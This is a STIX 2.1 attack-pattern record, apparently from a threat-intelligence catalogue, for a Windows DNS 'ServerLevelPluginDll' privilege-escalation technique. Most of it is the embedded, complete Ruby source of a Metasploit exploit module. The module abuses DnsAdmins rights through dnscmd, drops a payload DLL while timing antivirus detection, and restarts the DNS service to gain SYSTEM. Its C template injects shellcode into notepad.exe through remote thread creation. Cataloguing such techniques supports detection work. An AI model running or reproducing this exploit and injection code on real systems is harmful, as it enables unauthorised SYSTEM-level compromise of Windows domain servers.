{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--53b9cf18-6d02-48d6-8237-ce4f8650b806",
    "created": "2024-08-14T16:50:08.723385Z",
    "modified": "2024-08-14T16:50:08.723389Z",
    "name": "DnsAdmin ServerLevelPluginDll Feature Abuse Privilege Escalation",
    "description": " This module exploits a feature in the DNS service of Windows Server. Users of the DnsAdmins group can set the `ServerLevelPluginDll` value using dnscmd.exe to create a registry key at `HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\` named `ServerLevelPluginDll` that can be made to point to an arbitrary DLL. After doing so, restarting the service will load the DLL and cause it to execute, providing us with SYSTEM privileges. Increasing WfsDelay is recommended when using a UNC path.  Users should note that if the DLLPath variable of this module is set to a UNC share that does not exist the DNS server on the target will not be able to restart. Similarly if a UNC share is not utilized, and users instead opt to drop a file onto the disk of the target computer, and this gets picked up by Anti-Virus after the timeout specified by `AVTIMEOUT` expires, its possible that the `ServerLevelPluginDll` value of the `HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\` key on the target computer may point to an nonexistant DLL which will also prevent the DNS server from being able to restart. Users are advised to refer to the documentation for this module for advice on how to resolve this issue should it occur.  This module has only been tested and confirmed to work on Windows Server 2019 Standard Edition, however it should work against any Windows Server version up to and including Windows Server 2019.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/dnsadmin_serverlevelplugindll.rb",
            "external_id": "dnsadmin_serverlevelplugindll.rb"
        },
        {
            "source_name": "reference",
            "url": "https://adsecurity.org/?p=4064"
        },
        {
            "source_name": "reference",
            "url": "http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/compiler/windows'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Services\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'DnsAdmin ServerLevelPluginDll Feature Abuse Privilege Escalation',\n        'Description' => %q{\n          This module exploits a feature in the DNS service of Windows Server. Users of the DnsAdmins group can set the\n          `ServerLevelPluginDll` value using dnscmd.exe to create a registry key at `HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\`\n          named `ServerLevelPluginDll` that can be made to point to an arbitrary DLL. After doing so, restarting the service\n          will load the DLL and cause it to execute, providing us with SYSTEM privileges. Increasing WfsDelay is recommended\n          when using a UNC path.\n\n          Users should note that if the DLLPath variable of this module is set to a UNC share that does not exist,\n          the DNS server on the target will not be able to restart. Similarly if a UNC share is not utilized, and\n          users instead opt to drop a file onto the disk of the target computer, and this gets picked up by Anti-Virus\n          after the timeout specified by `AVTIMEOUT` expires, its possible that the `ServerLevelPluginDll` value of the\n          `HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\` key on the target computer may point to an nonexistant DLL,\n          which will also prevent the DNS server from being able to restart. Users are advised to refer to the documentation for\n          this module for advice on how to resolve this issue should it occur.\n\n          This module has only been tested and confirmed to work on Windows Server 2019 Standard Edition, however it should work against any Windows\n          Server version up to and including Windows Server 2019.\n        },\n        'References' => [\n          ['URL', 'https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83'],\n          ['URL', 'https://adsecurity.org/?p=4064'],\n          ['URL', 'http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html']\n        ],\n        'DisclosureDate' => '2017-05-08',\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Shay Ber', # vulnerability discovery\n          'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module\n        ],\n        'Platform' => 'win',\n        'Targets' => [[ 'Automatic', {} ]],\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' => {\n          'WfsDelay' => 20,\n          'EXITFUNC' => 'thread'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_DOWN], # The service can go down if AV picks up on the file at an\n          # non-optimal time or if the UNC path is typed in wrong.\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getsid\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DLLNAME', [ true, 'DLL name (default: msf.dll)', 'msf.dll']),\n        OptString.new('DLLPATH', [ true, 'Path to DLL. Can be a UNC path. (default: %TEMP%)', '%TEMP%']),\n        OptBool.new('MAKEDLL', [ true, 'Just create the DLL, do not exploit.', false]),\n        OptInt.new('AVTIMEOUT', [true, 'Time to wait for AV to potentially notice the DLL file we dropped, in seconds.', 60])\n      ]\n    )\n\n    deregister_options('FILE_CONTENTS')\n  end\n\n  def check\n    version = get_version_info\n    if version.windows_server?\n      vprint_good('OS seems vulnerable.')\n    else\n      vprint_error('OS is not vulnerable!')\n      return Exploit::CheckCode::Safe\n    end\n\n    username = client.sys.config.getuid\n    user_sid = client.sys.config.getsid\n    hostname = sysinfo['Computer']\n    vprint_status(\"Running check against #{hostname} as user #{username}...\")\n\n    srv_info = service_info('DNS')\n    if srv_info.nil?\n      vprint_error('Unable to enumerate the DNS service!')\n      return Exploit::CheckCode::Unknown\n    end\n\n    if srv_info && srv_info[:display].empty?\n      vprint_error('The DNS service does not exist on this host!')\n      return Exploit::CheckCode::Safe\n    end\n\n    # for use during permission check\n    if srv_info[:dacl].nil?\n      vprint_error('Unable to determine permissions on the DNS service!')\n      return Exploit::CheckCode::Unknown\n    end\n    dacl_items = srv_info[:dacl].split('D:')[1].scan(/\\((.+?)\\)/)\n\n    vprint_good(\"DNS service found on #{hostname}.\")\n\n    # user must be a member of the DnsAdmins group to be able to change ServerLevelPluginDll\n    group_membership = get_whoami\n    unless group_membership\n      vprint_error('Unable to enumerate group membership!')\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless group_membership.include? 'DnsAdmins'\n      vprint_error(\"User #{username} is not part of the DnsAdmins group!\")\n      return Exploit::CheckCode::Safe\n    end\n\n    # find the DnsAdmins group SID\n    dnsadmin_sid = ''\n    group_membership.each_line do |line|\n      unless line.include? 'DnsAdmins'\n        next\n      end\n\n      vprint_good(\"User #{username} is part of the DnsAdmins group.\")\n      line.split.each do |item|\n        unless item.include? 'S-'\n          next\n        end\n\n        vprint_status(\"DnsAdmins SID is #{item}\")\n        dnsadmin_sid = item\n        break\n      end\n      break\n    end\n\n    # check if the user or DnsAdmins group has the proper permissions to start/stop the DNS service\n    if dacl_items.any? { |dacl_item| dacl_item[0].include? dnsadmin_sid }\n      dnsadmin_dacl = dacl_items.select { |dacl_item| dacl_item[0].include? dnsadmin_sid }[0]\n      if dnsadmin_dacl.include? 'RPWP'\n        vprint_good('Members of the DnsAdmins group can start/stop the DNS service.')\n      end\n    elsif dacl_items.any? { |dacl_item| dacl_item[0].include? user_sid }\n      user_dacl = dacl_items.select { |dacl_item| dacl_item[0].include? user_sid }[0]\n      if user_dacl.include? 'RPWP'\n        vprint_good(\"User #{username} can start/stop the DNS service.\")\n      end\n    else\n      vprint_error(\"User #{username} does not have permissions to start/stop the DNS service!\")\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    # get system architecture\n    arch = sysinfo['Architecture']\n    if arch != payload_instance.arch.first\n      fail_with(Failure::BadConfig, 'Wrong payload architecture!')\n    end\n\n    # no exploit, just create the DLL\n    if datastore['MAKEDLL'] == true\n      # copypasta from lib/msf/core/exploit/fileformat.rb\n      # writes the generated DLL to ~/.msf4/local/\n      dllname = datastore['DLLNAME']\n      full_path = store_local('dll', nil, make_serverlevelplugindll(arch), dllname)\n      print_good(\"#{dllname} stored at #{full_path}\")\n      return\n    end\n\n    # will exploit\n    if is_system?\n      fail_with(Failure::BadConfig, 'Session is already elevated!')\n    end\n\n    unless [CheckCode::Vulnerable].include? check\n      fail_with(Failure::NotVulnerable, 'Target is most likely not vulnerable!')\n    end\n\n    # if the DNS service is not started, it will throw RPC_S_SERVER_UNAVAILABLE when trying to set ServerLevelPluginDll\n    print_status('Checking service state...')\n    svc_state = service_status('DNS')\n    unless svc_state[:state] == 4\n      print_status('DNS service is stopped, starting it...')\n      service_start('DNS')\n    end\n\n    # the service must be started before proceeding\n    total_wait_time = 0\n    loop do\n      svc_state = service_status('DNS')\n      if svc_state[:state] == 4\n        sleep 1\n        break\n      else\n        sleep 2\n        total_wait_time += 2\n        fail_with(Failure::TimeoutExpired, 'Was unable to start the DNS service after 3 minutes of trying...') if total_wait_time >= 90\n      end\n    end\n\n    # the if block assumes several things:\n    # 1. operator has set up their own SMB share (SMB2 is default for most targets), as MSF does not support SMB2 yet\n    # 2. operator has generated their own DLL with the correct payload and architecture\n    # 3. operator's SMB share is accessible from the target. \"Enable insecure guest logons\" is \"Enabled\" on the target or\n    #    the target falls back to SMB1\n    dllpath = expand_path(\"#{datastore['DLLPATH']}\\\\#{datastore['DLLNAME']}\").strip\n    if datastore['DLLPATH'].start_with?('\\\\\\\\')\n\n      # Using session.shell_command_token over cmd_exec() here as @wvu-r7 noticed cmd_exec() was broken under some situations.\n      build_num_raw = session.shell_command_token('cmd.exe /c ver')\n      build_num = build_num_raw.match(/\\d+\\.\\d+\\.\\d+\\.\\d+/)\n      if build_num.nil?\n        print_error(\"Couldn't retrieve the target's build number!\")\n        return\n      else\n        build_num = build_num_raw.match(/\\d+\\.\\d+\\.\\d+\\.\\d+/)[0]\n        vprint_status(\"Target's build number: #{build_num}\")\n      end\n\n      build_num_gemversion = Rex::Version.new(build_num)\n\n      # If the target is running Windows 10 or Windows Server versions with a\n      # build number of 16299 or later, aka v1709 or later, then we need to check\n      # if \"Enable insecure guest logons\" is enabled on the target system as per\n      # https://support.microsoft.com/en-us/help/4046019/guest-access-in-smb2-disabled-by-default-in-windows-10-and-windows-ser\n      if (build_num_gemversion >= Rex::Version.new('10.0.16299.0'))\n        # check if \"Enable insecure guest logons\" is enabled on the target system\n        allow_insecure_guest_auth = registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanWorkstation\\\\Parameters', 'AllowInsecureGuestAuth')\n        unless allow_insecure_guest_auth == 1\n          fail_with(Failure::BadConfig, \"'Enable insecure guest logons' is not set to Enabled on the target system!\")\n        end\n      end\n      print_status('Using user-provided UNC path.')\n    else\n      write_file(dllpath, make_serverlevelplugindll(arch))\n      print_good(\"Wrote DLL to #{dllpath}!\")\n      print_status(\"Sleeping for #{datastore['AVTIMEOUT']} seconds to ensure the file wasn't caught by any AV...\")\n      sleep(datastore['AVTIMEOUT'])\n      unless file_exist?(dllpath.to_s)\n        print_error('Woops looks like the DLL got picked up by AV or somehow got deleted...')\n        return\n      end\n      print_good(\"Looks like our file wasn't caught by the AV.\")\n    end\n\n    print_warning('Entering danger section...')\n\n    print_status(\"Modifying ServerLevelPluginDll to point to #{dllpath}...\")\n    dnscmd_result = cmd_exec(\"cmd.exe /c dnscmd \\\\\\\\#{sysinfo['Computer']} /config /serverlevelplugindll #{dllpath}\").to_s.strip\n    unless dnscmd_result.include? 'success'\n      fail_with(Failure::UnexpectedReply, dnscmd_result.split(\"\\n\")[0])\n    end\n\n    print_good(dnscmd_result.split(\"\\n\")[0])\n\n    # restart the DNS service\n    print_status('Restarting the DNS service...')\n    restart_service\n  end\n\n  def on_new_session(session)\n    if datastore['DLLPATH'].start_with?('\\\\\\\\')\n      return\n    else\n      if session.type == ('meterpreter') && !session.ext.aliases.include?('stdapi')\n        session.core.use('stdapi')\n      end\n\n      vprint_status('Erasing ServerLevelPluginDll registry value...')\n      cmd_exec(\"cmd.exe /c dnscmd \\\\\\\\#{sysinfo['Computer']} /config /serverlevelplugindll\")\n      print_good('Exited danger zone successfully!')\n\n      dllpath = expand_path(\"#{datastore['DLLPATH']}\\\\#{datastore['DLLNAME']}\").strip\n      restart_service('session' => session, 'dllpath' => dllpath)\n    end\n  end\n\n  def restart_service(opts = {})\n    # for deleting the DLL\n    if opts['session'] && opts['dllpath']\n      session = opts['session']\n      dllpath = opts['dllpath']\n    end\n\n    service_stop('DNS')\n    # see if the service has really been stopped\n    total_wait_time = 0\n    loop do\n      svc_state = service_status('DNS')\n      if svc_state[:state] == 1\n        sleep 1\n        break\n      else\n        sleep 2\n        total_wait_time += 2\n        fail_with(Failure::TimeoutExpired, 'Was unable to stop the DNS service after 3 minutes of trying...') if total_wait_time >= 90\n      end\n    end\n\n    # clean up the dropped DLL\n    if session && dllpath && !datastore['DLLPATH'].start_with?('\\\\\\\\')\n      vprint_status(\"Removing #{dllpath}...\")\n      session.fs.file.rm dllpath\n    end\n\n    service_start('DNS')\n    # see if the service has really been started\n    total_wait_time = 0\n    loop do\n      svc_state = service_status('DNS')\n      if svc_state[:state] == 4\n        sleep 1\n        break\n      else\n        sleep 2\n        total_wait_time += 2\n        fail_with(Failure::TimeoutExpired, 'Was unable to start the DNS service after 3 minutes of trying...') if total_wait_time >= 90\n      end\n    end\n  end\n\n  def make_serverlevelplugindll(arch)\n    # generate the payload\n    payload = generate_payload\n    # the C template for the ServerLevelPluginDll DLL\n    c_template = %|\n        #include <Windows.h>\n        #include <stdlib.h>\n        #include <String.h>\n\n        BOOL APIENTRY DllMain __attribute__((export))(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {\n            switch (dwReason) {\n                case DLL_PROCESS_ATTACH:\n                case DLL_THREAD_ATTACH:\n                case DLL_THREAD_DETACH:\n                case DLL_PROCESS_DETACH:\n                    break;\n            }\n\n            return TRUE;\n        }\n\n        int DnsPluginCleanup __attribute__((export))(void) { return 0; }\n        int DnsPluginQuery __attribute__((export))(PVOID a1, PVOID a2, PVOID a3, PVOID a4) { return 0; }\n        int DnsPluginInitialize __attribute__((export))(PVOID a1, PVOID a2) {\n            STARTUPINFO startup_info;\n            PROCESS_INFORMATION process_info;\n            char throwaway_buffer[8];\n\n            ZeroMemory(&startup_info, sizeof(startup_info));\n            startup_info.cb = sizeof(STARTUPINFO);\n            startup_info.dwFlags = STARTF_USESHOWWINDOW;\n            startup_info.wShowWindow = 0;\n\n            if (CreateProcess(NULL, \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info)) {\n                HANDLE processHandle;\n                HANDLE remoteThread;\n                PVOID remoteBuffer;\n\n                unsigned char shellcode[] = \"SHELLCODE_PLACEHOLDER\";\n\n                processHandle = OpenProcess(0x1F0FFF, FALSE, process_info.dwProcessId);\n                remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, 0x3000, PAGE_EXECUTE_READWRITE);\n                WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);\n                remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);\n\n                CloseHandle(process_info.hThread);\n                CloseHandle(processHandle);\n            }\n\n            return 0;\n        }\n    |\n\n    c_template.gsub!('SHELLCODE_PLACEHOLDER', Rex::Text.to_hex(payload.raw).to_s)\n\n    cpu = nil\n    case arch\n    when 'x86'\n      cpu = Metasm::Ia32.new\n    when 'x64'\n      cpu = Metasm::X86_64.new\n    else\n      fail_with(Failure::NoTarget, 'Target arch is not compatible')\n    end\n\n    print_status('Building DLL...')\n    Metasploit::Framework::Compiler::Windows.compile_c(c_template, :dll, cpu)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-05-08",
    "x_mitre_platforms": [
        "win'"
    ]
}